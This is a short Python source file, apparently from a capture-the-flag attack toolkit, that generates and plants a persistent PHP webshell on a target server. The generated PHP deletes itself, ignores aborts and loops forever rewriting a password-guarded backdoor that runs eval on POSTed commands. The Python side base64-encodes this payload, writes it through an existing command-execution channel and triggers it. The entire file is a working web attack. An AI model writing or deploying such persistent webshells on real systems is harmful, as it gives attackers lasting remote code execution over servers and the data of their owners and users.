from utils.utils import Utils
from config import Config
import base64
class Shell:
    def makeShell(url):
        shellCode = '''
        <?php
        ignore_user_abort(true);
        set_time_limit(0);
        unlink(__FILE__);
        $file = '{}.php';
        $code = '<?php if(md5($_GET["pass"])=="{}"){{eval($_POST["cmd"]);}} ?>no_flag';
        while (1){{
            file_put_contents($file,$code);
            usleep(15);
        }}
    ?>
        '''.format(Config.shellPath + Utils.getMemShellName(url),Utils.getMemShellPass(url))
        return shellCode
    async def writeShell(url):
        shellCode = Shell.makeShell(url)
        shellCodeB64 = base64.b64encode(bytes(shellCode.encode("UTF-8"))).decode()
        command = "file_put_contents('{}',base64_decode('{}'));".format(
            Config.shellPath + ".xux.php",
            shellCodeB64
        )
        #send the write memshell request
        await Utils.exec(url,command)   
        #trigger the memshell
        await Utils.trigger(url)

